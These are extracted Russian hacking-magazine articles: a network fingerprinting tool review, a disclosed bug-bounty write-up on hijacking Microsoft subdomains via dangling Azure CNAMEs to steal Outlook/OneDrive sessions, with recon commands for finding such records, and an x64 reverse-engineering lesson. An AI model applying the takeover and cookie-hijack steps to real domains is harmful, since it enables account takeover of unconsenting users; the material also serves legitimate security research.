 • режим RST+ подразумевает исследова ние тра фика для узла, находящего‐
   ся за файрволом, который отклоняет подключения;
 • режим MiTM — исследова ние соединения меж ду узлами, трафик которых
   ты можешь сниффить без вмешательства с твоей стороны.

Кроме того, p0f умеет определять, работает ли в сети NAT, шейперы или фай‐
рволы, отслеживать трас сировку пакета до заданного узла и вычис лять его
аптайм. При этом тулза не генерирует никаких собственных запросов и про‐
чего подозрительного трафика, что само по себе неоспоримое преимущес‐
тво, если иссле дователь желает оста вать ся в сети незамеченным.
  Версия p0f v3 была переписана разработчиками с нуля, поэтому «база
отпечатков» там не самая полная. Если верить официальному сайту, прог‐
рамме не хватает данных о ста рых версиях операционных систем вроде Win‐
dows 9x, IRIS и им подобных. Но пользователи могут помочь проекту, добавив
в базы результаты собственных экспериментов с прог раммой.


NETSCANTOOLS
 • Сайт: netscantools.com
 • Платформа: Windows

Бесплатная утилита NetScanTools Basic появи лась еще в 2009 году и с тех пор
претерпела лишь незначитель ные изменения. Умеет она немного: с ее
помощью можно получить данные Whois (а без нее, наверное, никак), выпол‐
нить traceroute (для тех, кто не умеет пользоваться командной строкой),
отправить DNS‐запросы и попинговать уда лен ные хосты и так, и сяк, и впри‐
сядку, то есть управляя параметрами пин га. Негусто.
  А вот коммерческая вер сия Pro может похвастать ся более широки ми воз‐
можностями. Она умеет работать с различными протоколами, включая ARP
и SNMP, перехватывать и ана лизировать пакеты, получать DNS‐записи
для заданных IP‐адресов, искать открытые TCP‐ и UDP‐порты на удаленном
хосте, опре делять под держиваемые им версии SMB, искать устройства
в сети, в том числе SMTP‐серверы с открытыми релеями. В сети Active Direc‐
tory NetScanTools может найти все рас шаренные папки, даже скрытые. В сос‐
таве софтины есть генера тор пакетов TCP, UDP, ICMP, CDP, RAW, в котором
можно менять различные параметры, бла года ря чему NetScanTools легко
и непринужденно превращается во флудер.





  NetScanTools — интересный инс трумент с кучей функций. Жалко, платный

В целом можно сказать, что NetScanTools Pro довольно интересный проект,
вклю чающий инструментарий для активного и пассивного исследования сети.
Только вот прайс в 249 долларов немного кусач, особенно если учесть, что
вполне себе бесплатные NetworkMiner и Nmap обла дают практически тем же
набором базовых функций. Впрочем, с сайта раз работчиков можно ска‐
чать 30‐дневную триальную версию, которая поможет тебе решить, стоит ли
искать кряк пачку баксов, или лучше вос пользовать ся фриварным софтом.


X PROBE
 • Сайт: https://sourceforge.net/projects/xprobe/
 • Платформа: GNU/Linux

Это линуксовая утилита, использующая активные методы фингерпринтинга
на основе тех же методик и сценари ев, что при меняются в Nmap. Одна
из наиболее интересных особенностей X probe — умение обнаруживать
ханипоты (серверы‐приманки, специально созданные для ловли доверчивых
хакеров) и подозритель ные узлы с измененными настройками сте ка TCP/IP.
  С использованием заложенных в софтину алгоритмов нечеткой логики X
probe позволяет обнаруживать сервисы, скры тые брандмауэром. Помимо
определения ОС на уда ленном хосте с использованием ICMP‐запросов,
в  возможности  программы  входит  сканирование  TCP‐  и UDP‐портов.
К сожалению, последняя версия утилиты датиро вана 2014 годом и, похоже,
с тех пор проект практически не развивается.


ETTERCAP
 • Сайт: https://www.ettercap‐project.org/
 • Платформа: GNU/Linux

Ettercap — это широко известный в узких кру гах сниф фер, часто исполь‐
зуемый для атак типа MiTM. Работает он практичес ки во всех линуксах, кроме
OpenSuSe, а также на платформах UNIX/BSD, кроме Solaris. Говорят, особо
могучие шаманы запускали Ettercap даже на macOS, но документального под‐
тверждения этим слухам нет, ибо те, кому это удалось, погибли, лопнув
от гордости.
   Как и другие снифферы, этот умеет работать с протоколами Telnet, FTP,
IMAP, SMB, LDAP и нес колькими дру гими, но с Ettercap можно потрошить
и шифрованный трафик, переда ваемый по HTTPS и SSH. Несмотря на то что
тул за создавалась с прицелом под MiTM, с ее помощью впол не можно иден‐
тифицировать удален ные операционные системы методом фингерпринтинга,
наряду с такими рутин ными процедурами, как определение IP, открытых пор‐
тов, запущенных на исследуемом узле служб, типа адаптера и MAC‐адреса
сетевого интерфейса.
  После установки и запус ка Ettercap начинает сниффить трафик в сети
и собирать результат в создаваемых программой про файлах, отку да его мож‐
но извлечь для анализа. Этот анализ поз воляет уста новить, в частности, такие
данные, как IP‐адрес, имя и тип хос та, предположительная версия работа‐
ющей там ОС, открытые порты и запущен ные сервисы. Впол не достаточный
стартовый набор для любого исследователя.


THC-ARCHIVE
На гитхабе по адресу https://github.com/vanhauser‐thc/THC‐Archive/ лежит
богатый архив утилит и спло итов, которые могут стать отличным подспорьем
для пентестера. Весь софт долго и кропот ливо собирала команда злоумыш‐
ленников единомышленников под названием The Hacker’s Choice, основан‐
ная аж в 1995 году и, судя по активнос ти в Twitter, неплохо чувству ющая себя
по сей день.
   Чуваки предлагают множество интерес ных проектов, но нас интересуют
в  основном   тулзы  из  раз дела   https://github.com/vanhauser‐thc/THC‐
Archive/tree/master/Tools. Тут, в частнос ти, можно найти сканер Amap, поз‐
воляющий отследить сервисы, работа ющие на нес тандартных портах.
  Некоторые наивные сисадмины искренне надеются, что смогут защитить
себя от атаки, если поднимут, например, FTP‐сервер, SSH или  Telnet
на каком‐нибудь нестандартном порте вместо при вычного. Вот с такими
хитрожоыми админами и призван бороться Amap.
  Обычные сканеры стучат ся на стандартные порты, анализируют получен‐
ные отклики и, если они не соот ветс твуют ожидаемому, обламываются. Amap
вместо этого опрашивает весь диапазон портов и сверяет отклики со своей
базой данных в поисках соот ветс твия. Таким обра зом, сервис, работающий
на каком‐либо пор те, идентифицируется по его характерным признакам,
содержащимся в ответе.
   Чтобы облегчить себе жизнь, можно исполь зовать Amap совмес тно
с любым другим сканером. Ска нер определя ет список открытых портов
на интересующем нас хосте, а Amap потом прощупы вает этот диапазон
и выясняет, какие именно службы юза ют эти порты и что полезного из этого
может извлечь исследова тель. На стра ничке The Hacker’s Choice можно ска‐
чать Amap как под вин ду, так и под Linux, представлены все версии утилиты,
начиная с самых ранних.


ВЫВОДЫ
Статьи в «Хакере» принято завершать крат ким заключительным разделом,
поэтому не будем злить редактора нарушать доб рую традицию. Как ты
догадываешься, у большинс тва описанных здесь утилит возможности гораз‐
до шире, чем просто определение типа ОС на уда ленном хосте. Поэтому
небесполезно будет попробовать озна комиться с каждой из них. А уж что ты
будешь в итоге исполь зовать в деле — решать тебе.
ВЗЛОМ





                                       Александр Сидуков
                                              asidukov@gmail.com
 ЗАХВАТ
  ПОДДОМЕНОВ
            КАК Я ЗАХВАТИЛ
      ПОДДОМЕНЫ MICROSOFT
     И КАК РАБОТАЮТ ТАКИЕ АТАКИ





Несколько лет назад мне удалось захватить поддомены
на сайтах компании Microsoft и получить доступ к почте
и файлам пользователей Outlook и OneDrive, а также к дан‐
ным профилей на Xbox.com. Я расскажу о том, что конкретно
для этого потребова лось, а заодно посмотрим, как такая
атака может выглядеть сейчас, в 2020 году.


ЗАХВАТ ЧЕРЕЗ ЗАБЫТЫЙ CNAME
Современные компании используют большое количество облачных сервисов.
Для простоты подклю чения используются поддомены основного домена
организации, а  контент обслуживается облачным сервисом напрямую.
В таком случае администра торам компании дос таточно добавить DNS‐запись
вида CNAME  (canonical name  или, проще  говоря, алиас) со ссыл кой
на облачный сервис.
  Например, настрой ка GitHub Pages для домена wiki.company.com может
выглядеть следующим обра зом:



  $ dig wiki.company.com +nostats +nocomments +nocmd
  wiki.company.com            1728    IN  CNAME company‐wiki.github.io.
  company‐wiki.github.io.     3529  IN  A     185.199.110.153


Но что будет, если репозиторий удалят вместе с нас тройкой привязки
к домену wiki.company.com? Вполне вероятно, что DNS‐запись при этом оста‐
нется, — добавляет эти записи обычно админ, а следить, чтобы их опе ратив‐
но удаляли, чаще всего некому. Тут игра ет человеческий фактор.
  В таком случае зло умышленник может соз дать репозиторий и привязать
его к wiki.company.com. Пос кольку CNAME wiki.company.com уже указывает
на company‐wiki.github.io, с этого момента содержимое wiki.company.com
будет контролировать злоумыш ленник.
   Угнанный поддомен ком пании может использоваться для похищения сес‐
сионных кук, фишинговых атак, обхода CORS и CSP.


ЗАХВАТ ДОМЕНОВ НА ВНЕШНИХ ССЫЛКАХ
Возможен также вариант захвата доменов, которые не принад лежат орга‐
низации, но ссылки на которые используются для загрузки внешних скриптов.
Представим, что страница приложения выглядит так:


<!doctype html>
<html lang="en">
<head>
  <meta charset="utf‐8">
  <title>app.company.com Application</title>
  <link rel="stylesheet" href="css/application.css">
</head>
<body>
  <script src="https://subdomain.3rdparty.com/script.js"></script>
  ...
</body>
</html>

Если будет возможен захват поддомена subdomain.3rdparty.com по схеме
CNAME, злоумышленник сможет контро лировать содержимое и выполнить
произвольный код в контексте app.company.com. А если домен 3rdparty.com
истек и удален — злоумышленник может вновь зарегистрировать его и кон‐
тролировать все его поддомены.


УГОНЯЕМ СЕССИИ OUTLOOK И ONEDRIVE
Несколько лет назад мне удалось захватить множество поддоменов Microsoft,
в том числе для Live.com. Это дало возможность беспрепятственно перех‐
ватывать сессии поль зователей Outlook и OneDrive. Как это было? Сейчас
расскажу.
  При регистрации любого сервиса Azure (например, виртуального сервера
или виртуального хостинга) ука зывается имя, по которому можно потом мож‐
но обращаться напрямую либо через CNAME. Нап ример, веб‐приложение
будет доступно по адресу XYZ.azurewebsites.net, где XYZ — имя приложения.
  Для различных сервисов Azure использует набор разных доменов, они так‐
же могут немного отличать ся и иметь префикс реги она размещения ресурса:


*.cloudapp.net
*.cloudapp.azure.com
*.azurewebsites.net
*.blob.core.windows.net
*.cloudapp.azure.com
*.azure‐api.net
*.azurehdinsight.net
*.azureedge.net
*.azurecontainer.io
*.database.windows.net
*.azuredatalakestore.net
*.search.windows.net
*.azurecr.io
*.redis.cache.windows.net
*.azurehdinsight.net
*.servicebus.windows.net
*.visualstudio.com

В Microsoft этот механизм применяют и для сво их приложений, в тех же прос‐
транствах имен, что и остальные пользователи. При анализе легко увидеть,
что множество поддоменов Microsoft.com используют сервисы Azure и ука‐
зывают на набор доменов, приведенный выше.
   Что происходит после того, как сервис перес тает использоваться Mi‐
crosoft и удаляется? Мы можем зарегистри ровать сервис Azure на нашей
учетной записи, но с тем же именем. Таким обра зом, существу ющая запись
CNAME будет указывать уже на соз данный нами сервис, который мы можем
полностью контролировать.
   Как это было на практике? Собрав списки поддоменов в логах Certiﬁcate
Transparency, а так же с помощью атак по сло варям я нашел те из них, что ссы‐
лались на облачные сервисы Azure. Мое внимание привлек домен migreport‐
s.eduadmin.live.com. Он ука зывал (CNAME) на домен ncuprdmigreporting.‐
cloudapp.net, но далее домен не раз решался (NXDOMAIN):



  $ dig migreports.eduadmin.live.com
  ;; Got answer:
  ;; ‐>>HEADER<<‐ opcode: QUERY, status: NXDOMAIN, id: 16373


  ;; ANSWER SECTION:
  migreports.eduadmin.live.com 3599 IN CNAME
  ncuprdmigreporting.cloudapp.net.


Я создал виртуальную машину c Ubuntu в Azure и зарегистрировал сервис
с идентичным именем ncuprdmigreporting.cloudapp.net, без каких‐либо оши‐
бок и подводных камней.





           Регистрация сервиса с именем ncuprdmigreporting





                    DNS‐имя теперь за мной

Запустив виртуальную машину и на ней nginx, я открыл в браузе ре адрес mi‐
greports.eduadmin.live.com и увидел заветное «Welcome to nginx!». Домен был
под моим контролем.
  Сервисы Outlook и OneDrive размещаются на адресах outlook.live.com
и onedrive.live.com соот ветственно. Быстрый анализ показал, что для обоих
сервисов сессионные куки устанавлива ются на весь домен live.com, а значит,
я могу перехватывать сессии пользователей.





                   Анализ сес сионных кук live.com

Но сессионные куки были защищены флагом Secure, и передаваться они
будут только по HTTPS — для доступа к ним мне нужен SSL‐сертификат.
Сперва это казалось проблемой, но, поразмыслив пару минут, я бес препятс‐
твенно его получил с помощью Let’s Encrypt, с той же виртуальной машины.
Бинго!
  Мне повезло: я успешно получил сертификат. Часть доменов Microsoft
находится в черном спис ке Let’s Encrypt и для них запросы на получение сер‐
тификата блокируются, но live.com к таким доменам не относился.





        Let’s Encrypt блокиру ет выдачу сертификатов для *.outlook.com

Теперь я мог контролировать содержимое сайта по HTTPS и перехватывать
сессионные куки. Я подготовил простую страницу с PoC и попробовал вос‐
произвести атаку на угон сессии. Прос той подставки сессионных кук ока‐
залось достаточно для того, чтобы попасть в сессию пользователя незави‐
симо от браузера или IP‐адреса. Более того, смена пароля или завершение
сессии пользователем никак не влияли на функциональность украденной
сессии — ей по‐прежнему можно было пользоваться!
  Мне также удалось проделать такой трюк с xbox.com — и получить доступ
к данным профиля пользователя. К тому же в логах веб‐сервера я наблюдал
большое количество консолей Xbox, обра щавшихся к моему серверу, —
не исключено, что в плохих руках они бы могли превратиться в ботнет.





Решить проблему в Microsoft могли бы, например, запретив указывать про‐
извольное название в сервисе Azure. Вместо этого сервис мог бы генери‐
ровать такое имя пол ностью либо его пос тфикс. Я сообщил о проблеме в Mi‐
crosoft по программе Bug Bounty и получил воз награждение.


Тай млайн
 • 14.07.2017: я сооб щил в Microsoft об уяз вимости
 • 20.07.2017: подтверждение от Microsoft
 • 14.12.2017: проб лему пофиксили
 • 28.10.2018: выплата Bounty




ЧТО ТЕПЕРЬ? ЗАХВАТ ПОДДОМЕНОВ В 2020 ГОДУ
После этой истории прошло больше двух лет. Пред лагаю рассмотреть,
как может выглядеть поиск и захват поддоменов в 2020 году.
  Искать домены можно активно либо скрытно. Во втором слу чае исполь‐
зуются данные из публичных сервисов. Среди них:
 • дорки поисковиков (подробнее — в статье «Google как средс тво взлома»);
 • информация об исполь зуемых сертификатах SSL (SSL certiﬁcate trans‐
   parency logs);
 • сканеры интернета типа Shodan и Censys;
 • сервисы с архивными данными DNS типа DNSdumpster, SecurityTrails;
 • другие открытые данные, такие как DNS‐архивы Rapid7.

В активном режиме в нашем арсенале:
 • атаки на подбор, которые могут быть весь ма эффективными при исполь‐
   зовании хороших сло варей;
 • атаки AXFR, которые все еще зачас тую воз можны благодаря небезопас‐
  ным конфигурациям DNS‐серверов.


Тихая раз ведка
Начнем со скрытого поиска. К нашим услугам много источников: поисковые
системы, API сканеров интернета и прочие сервисы. К счастью, ручным сбо‐
ром инфы заниматься вряд ли потребуется, равно как и изобретать свои
средства автоматизации.


Amass
Amass — проект консорциума OWASP, неплохо выруча ет при сборе информа‐
ции о поддоменах. Чтобы вос пользовать ся  этой  утилитой, достаточно
написать что‐то в таком духе:


amass enum ‐passive ‐d company.com


Rapid7 DNS
Предлагаю допол нить наши результаты данными из Rapid7 Forward DNS
(FDNS). Это архивы DNS‐записей интернета.
   Такие записи можно ска чать и отфильтровать вручную, однако, учитывая,
что размер архива больше 300 Гбайт, для экономии времени и места можно
применить облачный сервис Athena, при надлежащий Amazon. Он позволяет
делать SQL‐запросы к данным в хранилище Rapid7, уже размещенном на S3.
  Создадим новый Сrawler в сервисе AWS Glue. В качестве источника ука‐
жем S3‐хранилище Rapid7.


s3://rapid7‐opendata/fdns/any/v1/date=202002





Остальные настройки можно оставить по умолчанию.





После сохранения настроек запус тим кра улер вручную. Теперь мы можем
выпол нять поиск по данным через SQL‐запросы.


SELECT *
FROM date_202002
WHERE name LIKE '%.company.com'

Можем искать только интересующие нас CNAME.


SELECT *
FROM date_202002
WHERE type = 'cname'
AND value LIKE '%.github.io';

Можно использовать и архивные данные за нес коль ко месяцев, прос то под‐
клю чив более старые базы. Это особен но пригодится, ведь нас инте ресуют
домены, которыми перес тали пользоваться.


Пе ребор
Для атак методом перебо ра хорошо работают словари commonspeak2, sub‐
lazerwlst, all.txt за авторством jhaddix.
  В качестве быстрого ска нера мож но использовать massdns. Будь акку‐
ратен с интерпретацией результатов, осо бенно если ищешь забытые CNAME.
В качестве резолверов для massdns используй надежные публичные DNS,
которые не модифицируют запросы, например Google и CloudFlare.


# Генерируем словарь для подбора на базе commonspeak2:
cat commonspeak2.txt | awk '{print $1".company.com"}' > subdomains.
txt


# Сканируем с massdns
massdns ‐s 15000 ‐o J ‐r resolvers.txt company_commonspeak2.txt >
subdomains_massdns.txt


AltDNS
Как еще можно допол нить список имен? С помощью пермутаций для найден‐
ных имен. Восполь зуемся AltDNS. На  вход подадим список доменов,
про которые мы уже зна ем:


# Генерируем пермутации
altdns ‐i subdomains_ok.txt ‐o subdomains_altdns.txt ‐w words.txt


# Сканируем с massdns
massdns ‐s 15000 ‐o J ‐r resolvers.txt subdomains_altdns.txt > subdom
ains_altdns_massdns.txt


Ищем забытые записи
Теперь, когда у нас есть списки поддоменов, нам нужно найти записи,
которые остались от уда ленных сервисов. Некоторые сервисы в таких случаях
возвращают ошибку 404 при обращении. Например, так делает GitHub Pages.





Другие име ют тип CNAME, но не имеют итогово го адреса (NXDOMAIN). Найти
такие можно, разбирая логи amass либо вот такой функци ей на Python.


import dns.resolver


def lookup(domain):
  result = []
  try:
    myresolver = dns.resolver.Resolver()
    myresolver.nameservers = ['8.8.8.8','8.8.4.4']


    # Рекурсивно получаем CNAME
  for rdata in myresolver.query(domain, 'CNAME'):
      if hasattr(rdata, 'target'):
        result.append("[CNAME]"+str(rdata.target))
        result += lookup(str(rdata.target))


  except dns.resolver.NoAnswer:
  # Получаем A‐запись для последнего CNAME
    try:
      for rdata in myresolver.query(domain, 'A'):
        result.append("[A]"+rdata.address)
    except dns.resolver.NoAnswer:
      result.append("NoAnswer")
      return result


  except dns.resolver.NXDOMAIN:
    result.append("NXDOMAIN")
    return result


  except:
    pass


  return result

Известно более 30 уязвимых сервисов, которые могут быть захвачены через
забытый CNAME. Их краткое описание есть в документе «Can  I take over
XYZ?».


ВЫВОДЫ
Практика показывает, что компании недооценива ют опасность этой атаки.
Перед ней могут быть уяз вимы любые клиенты облачных сервисов, будь то
маленький стартап, извес тный банк или крупная технологическая компания.
В ходе подготовки статьи ста ло понятно, что проб лема все еще остается
актуальной для Azure. Недавние новос ти это подтверждают.
ВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
          ОСНОВЫ
          ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex‐
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.

ИДЕНТИФИКАЦИЯ
СТАРТОВОГО КОДА
И ВИРТУАЛЬНЫХ

                                                            Юрий ЯзевФУНКЦИЙ
                                                                      Широко известен под
                                                                          псевдонимом yurembo.ПРИЛОЖЕНИЙ                                         Программист, разработчик
                                                                                  видеоигр, независимый
                                                                                исследователь. Старый авторПОД WIN64                                                                                журнала «Хакер».
                                                                                    yazevsoft@gmail.com





Если первого встречного программиста спросить, с какой
функции начинается выполнение Windows‐программы, веро‐
ятнее всего, мы услышим в ответ — «с WinMain». И это
будет ошибкой. На самом деле первым управление получает
стартовый код, скрыто вставляемый компилятором. Выпол‐
нив   необ ходимые   инициализационные   процедуры,
в какой‐то момент он вызыва ет WinMain, а после ее завер‐
шения вновь получает управление и выполняет капитальную
деинициализацию.


Фун дамен таль ные осно вы хакерс тва
Пятнадцать лет назад эпичес кий труд Криса Кас перски «Фундаментальные
основы хакерства» был настольной книгой каждого начинающего иссле дова‐
теля в области компьютерной безопасности. Однако время идет, и знания,
опубликованные Крисом, теряют актуальность. Редакторы «Хакера» попыта‐
лись обновить этот объемный труд и перенести его из вре мен Windows
2000 и Visual Studio 6.0 во времена Windows 10 и Visual Studio 2017.
  Читай так же:
 • Проверка аутентичнос ти и базовый взлом защиты
 • Знакомство с отладчиком
 • Продолжаем осваивать отладчик
 • Новые способы находить защитные механизмы в чужих программах
 • Выбираем лучший редактор для вскрытия исполняемых файлов Windows
 • Мастер‐класс по анализу исполняемых файлов в IDA Pro
 • Учимся искать клю чевые структуры язы ков высокого уровня




ИДЕНТИФИКАЦИЯ СТАРТОВЫХ ФУНКЦИЙ
В подавляющем большинс тве  случаев стартовый код не представляет
никакого интереса, и первой задачей при анализе становится поиск функции
WinMain. Если компилятор входит в число «знакомых» IDA, она опознает Win‐
Main автоматически, в про тивном же случае искать функцию приходится
руками и головой.
  Обычно в штатную поставку компилятора вклю чают исходные тексты его
библиотек, в том числе и процедуры стартового кода. Например, у Microsoft
Visual C++ стартовый код расположен в фай ле \VC\crt\src\vcruntime\mcr‐
texe.cpp. В нем содержится код для инициализации ASCII‐версий консоль‐
ных (main) приложе ний. В этой же папке лежат еще несколько файлов:
 • mwcrtexe.cpp — код из этого файла используется при старте консоль‐
   ных приложений с Unicode‐символами;
 • mcrtexew.cpp — вызывается при запус ке Windows‐при ложе ний (Win‐
   Main) с поддержкой ASCII;
 • mwcrtexew.cpp — служит для запуска Windows‐приложений с Юникодом.

После выполнения весьма небольшого блока кода управление из трех пос‐
ледних файлов передается в первый. У Embarcadero C++ Builder 10.3 (в
девичестве Borland C++) все файлы со startup‐кодом хранятся в отдельной
одноименной директории. В час тнос ти, файлы, содержащие стартовый код
для  Windows‐приложений,  находят ся  в  пап ке  \source\cpprtl\Source\
startup\. Ее содержимое нес колько похоже на vcruntime тем, что имеется
главный файл для запуска Win32‐приложений — c0nt.asm. Код из этого фай‐
ла вызывают другие файлы, содержащие ини циализации для под систем
на Win32: DLL, VCL, FMX (приложение FireMonkey, кросс‐платформенная гра‐
фическая подсистема). Если разоб рать ся с исходными текстами, понять
дизассемблированный листинг будет намного лег че!





  Embarcadero C++Builder. Начиная с этой версии у данной системы прог‐
  раммирования появилась Community‐редакция, которую можно халявно
  использовать целый год

А как быть, если для компиляции исследуемой программы использовался
неизвестный или недоступный тебе компилятор? Прежде чем приступать
к утомительному ручному анализу, давай вспомним, какой прототип имеет
функция WinMain:


int APIENTRY wWinMain(
    _In_ HINSTANCE     hInstance,     // Handle to current instance
    _In_opt_ HINSTANCE hPrevInstance, // Handle to previous instance
    _In_ LPWSTR        lpCmdLine,     // Pointer to command line
    _In_ int           nCmdShow)      // Show state of window

Обрати внимание: APIENTRY замещает WINAPI. Во‐первых, четыре аргумен‐
та — это достаточно мно го, и в большинстве слу чаев WinMain оказывается
самой «богатой» на аргу менты функцией стартового кода. Во‐вторых, пос‐
ледний заносимый в стек аргу мент — hInstance — чаще все го вычисляется
на лету вызовом функции GetModuleHandleW. То есть, если встретишь конс‐
трукцию типа CALL GetModuleHandleW, можно с высокой сте пенью уве рен‐
ности утверждать, что следующая функция и есть WinMain. Наконец, вызов
WinMain обычно расположен практичес ки в самом конце кода стартовой фун‐
кции. За ней бывает не более двух‐трех «замыкающих» строй функций, нап‐
ример __cexit.


Ком пилили, ком пилим и будем ком пилить!
До сего момента мы компилили наши примеры из командной строки:


 cl.exe <имя файла>.cpp /EHcs


В результате мы получали строгий, очищенный от мишуры машинный код,
после дизассемблирова ния которого в ассемблерном листинге отсутство‐
вали какие бы то ни было коммента рии и внят ные наз вания функций. Теперь
мы будем строить наши приложения прямиком из среды разработки (это
по‐прежнему Visual Studio 2017), чтобы при анализе кода использовать средс‐
тва, предоставляемые самим компилятором. Мы уже достаточно поупражня‐
лись и базовые конструкции языка высокого уровня можем определять с зак‐
рытыми глазами: на ощупь и по запаху!


Чтобы повторить следующий пример, в Visual Studio 2017 на C++ соз дай Win‐
dows Desktop  Application, скомпилируй приложение для платформы x64,
а затем итоговый экзешник открой в IDA. Рас смотрим получившийся код пов‐
нимательнее.
  Первое, на что стоит обра тить внимание, — это отличие от 32‐разрядной
платформы: здесь параметры передаются не через стек, а через регис тры
процессора. Раньше на платформе x86 в вызывающем коде параметры
заталкивались в стек с помощью инструкции PUSH, а в вызываемой процедуре
извлекались из него инструкцией POP. При затал кивании параметров в стек
неизбежно приходится обра щаться по адресам памяти. А мы уже крепко
усвоили, что обращение по адресам памяти, отсутству ющим в кеше процес‐
сора, занимает несоизмеримо больше времени.
  Однако через регистры передаются только первые четыре аргумента:
целочисленные через RCX, RDX, R8, R9, значения с плавающей точкой через
XMM0, XMM1, XMM2, XMM3. Если же параметров больше (а это довольно редкий
случай), то они так же, как и раньше, передаются через стек.
  В комментариях IDA дала аргументам осмысленные имена:


.text:000000014000150A  mov   r8, rax            ; lpCmdLine
.text:000000014000150D  mov   r9d, ebx           ; nCmdShow
.text:0000000140001510  xor   edx, edx           ; hPrevInstance
.text:0000000140001512  lea   rcx, cs:140000000h ; hInstance
.text:0000000140001519  call  wWinMain
.text:000000014000151E  mov   ebx, eax
.text:0000000140001520  call  __scrt_is_managed_app
.text:0000000140001525  test  al, al
.text:0000000140001527  jz    short loc_140001579
.text:0000000140001529  test  dil, dil
.text:000000014000152C  jnz   short loc_140001533
.text:000000014000152E  call  _cexit_0           ; Завершение
приложения

Но как понять, что находится по адресу cs:140000000h? IDA в комментарии
говорит, что там дол жен быть аргумент hInstance:


lea rcx, cs:140000000h ; hInstance.

Ассемблерная команда lea позволяет получить текущий адрес источника
(второй операнд). Значит, получение hInstance должно выпол няться через
косвенный вызов функции GetModuleHandleW.
   Если опустить взгляд на пару стро чек ниже вызова WinMain, мы увидим
вызов __scrt_is_managed_app, войдя в который обнаружим вызов нужной
функции:


.text:0000000140001C88  sub   rsp, 28h
.text:0000000140001C8C  xor   ecx, ecx           ; lpModuleName
.text:0000000140001C8E  call  cs:__imp_GetModuleHandleW

И уже последняя возвращает дес криптор модуля. Но не всегда это выглядит
столь же просто. Многие раз работчики, пользуясь наличием исходных тек‐
стов startup‐кода, модифицируют его (подчас весьма значительно). В резуль‐
тате выполнение программы может начинаться не с WinMain, а с любой дру‐
гой функции. К тому же теперь стартовый код может содержать критические
для понимания алгоритма операции (нап ример, расшифровщик основного
кода)! Поэтому всегда хотя бы мельком следует изучить startup‐код: не содер‐
жит ли он чего‐нибудь необычного?
   Аналогичным образом обстоят дела и с динамическими библиоте ками —
их выполнение начинается вовсе не с функции DllMain (если она, конечно,
вообще присутствует в DLL), а по умолчанию с __DllMainCRTStartup. Впро‐
чем, разработчики подчас изменяют умолчания, наз начая ключом /ENTRY ту
стартовую функцию, которая им нуж на.
   Строго говоря, неправильно называть DllMain стартовой функцией. Она
вызывается не только при загрузке DLL, но и при выгрузке, и при создании
либо уничтожении нового потока подключившим ее процес сом.
  Получая уведомления об этих событиях, раз работчик может предпри‐
нимать некоторые действия (например, подготавливать код к работе в мно‐
гопоточной среде). Весьма актуален вопрос: имеет ли все это значение
для анализа программы? Ведь чаще всего требуется проанализировать
не всю динамическую библиотеку целиком, а исследовать работу некоторых
экспортируемых ею функций.
   Если DllMain выполняет какие‐то действия (скажем, инициализиру ет
переменные), то осталь ные функции, на которые распространяется влияние
этих переменных, будут содержать пря мые ссылки на них, ведущие к DllMain.
Таким образом, не стоит «вручную» искать DllMain — она сама себя обна‐
ружит!
   Хорошо, если бы всег да это было так! Но жизнь сложнее всяких правил.
Вдруг в DllMain находится некий деструктивный код или биб лиотека в допол‐
нение к основной своей деятельнос ти шпи онит за потоками, отслеживая их
появление? Тогда без непосредс твенного анализа ее кода не обойтись.
  Обнаружить DllMain на порядок труднее, чем WinMain. Если ее не найдет
IDA — пиши пропало. Во‐первых, прототип DllMain достаточно незамыс‐
ловат и не содержит ничего характерного:


BOOL APIENTRY DllMain(
    HMODULE hModule,            // Handle to DLL module
    DWORD   ul_reason_for_call, // Reason for calling function
    LPVOID  lpReserved          // Reserved
)

А во‐вторых, ее вызов идет из самой гущи доволь но внушительной функции
__DllMainCRTStartup, так что найти именно тот CALL, который нам нужен,
нет никакой возможности. Впрочем, некото рые зацепки все‐таки есть. Нап‐
ример, при неудачной инициализации DllMain воз вращает FALSE, и код
__DllMainCRTStartup обязательно проверит это значение, в случае чего
прыгая аж к концу функции. Подоб ных ветвлений в теле стартовой функции
не так уж много, и обычно только одно из них свя зано с функцией, принима‐
ющей три аргумента.
  Для проведе ния следующего эксперимента в Visual Studio 2017 создай
простую динамическую библиотеку и откомпи лируй ее релиз ную версию
под платформу x64. Затем загрузи ее в IDA. Следующий листинг призван
показать идентификацию DllMain по коду неудачной ини циализации:


.text:000000018000131B  mov   r8, rsi         ; lpvReserved
.text:000000018000131E  mov   edx, edi        ; fdwReason
.text:0000000180001320  mov   rcx, r14        ; hinstDLL
.text:0000000180001323  call  DllMain
.text:0000000180001328  mov   ebx, eax
.text:000000018000132A  mov    rsp+58h+var_28], eax
.text:000000018000132E  test  eax, eax
.text:0000000180001330  jz    short loc_18000135B
.text:0000000180001332  mov   rax, cs:_pRawDllMain
.text:0000000180001339  test  rax, rax
.text:000000018000133C  jnz   short loc_180001347

Вверху приведенного листинга видно, что регис тры R8, EDX и RCX содержат
IpvReserved, fdwReason и hinstDLL соответс твенно. И как вид но, аргументы
передаются не через стек, а с помощью регистров. Значит, перед нами
и есть функция DllMain (исходный текст _DllMainCRTStartup содержится
в файле \VC\crt\src\vcruntime\dll_dllmain.cpp, который настоятельно
рекомендуется изучить).


КОНСОЛЬНЫЕ ПРИЛОЖЕНИЯ
Наконец, мы добрались и до функции main кон сольных приложений. Как всег‐
да, выполнение программы начина ется не с нее, а c функции mainCRTStart‐
up, инициализирующей кучу, систему ввода‐вывода, подготавливающую аргу‐
менты командной строки и только потом передающей управление main. Фун‐
кция main принимает всего два аргумента: int main  (int  argc,  char
**argv) — этого слишком мало, чтобы выделить ее среди остальных. Однако
на помощь приходит тот факт, что ключи командной строки дос тупны не толь‐
ко через аргументы, но и через гло бальные переменные — argc и argv соот‐
ветственно. Поэтому вызов main обычно выглядит так:


.text:0000000140001462  call  __p___argv_0
.text:0000000140001467  mov   rdi, [rax]
.text:000000014000146A  call  __p___argc_0
.text:000000014000146F  mov   rbx, rax
.text:0000000140001472  call  _get_initial_narrow_environment_0
.text:0000000140001477  mov   r8, rax
.text:000000014000147A  mov   rdx, rdi
.text:000000014000147D  mov   ecx, [rbx]
.text:000000014000147F  call  main
.text:0000000140001484  mov   ebx, eax
.text:0000000140001486  call  __scrt_is_managed_app
.text:000000014000148B  test  al, al
